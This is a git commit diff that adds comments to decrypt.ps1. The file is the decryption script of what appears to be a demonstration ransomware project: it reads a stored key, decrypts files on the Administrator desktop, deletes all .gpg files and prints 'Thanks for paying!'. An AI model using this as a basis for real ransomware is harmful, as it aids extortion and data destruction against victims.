7c263d730d79b47bd6f38a174175a2c57363961f
LouisNajdek <55063643+LouisNajdek@users.noreply.github.com>
2021-10-03 23:28:10 -0400

    Update decrypt.ps1

--- decrypt.ps1
+++ decrypt.ps1
@@ -1,9 +1,12 @@
 ﻿#Decryption
 
+# Set location of Encrypted file list
 $FilesToDecrypt = Get-Content -Path encryptedfiles.txt
 
+# Set location of cleartext symmetric key
 $SMEM = Get-Content -Path SMEM.txt
 
+# Decrypt files
 ForEach ($file in $FilesToDecrypt)
     {
         try { Remove-Encryption -FolderPath C:\Users\Administrator\Desktop -Password $SMEM }
@@ -11,6 +14,7 @@ ForEach ($file in $FilesToDecrypt)
         break
         }
 
+# Remove all .gpg encrypted files
 Get-ChildItem -Path 'C:\Users\Administrator\Desktop\' *.gpg | foreach { Remove-Item -Path $_.FullName }
 
 Write-Host("Your files have been decrypted! Thanks for paying!")
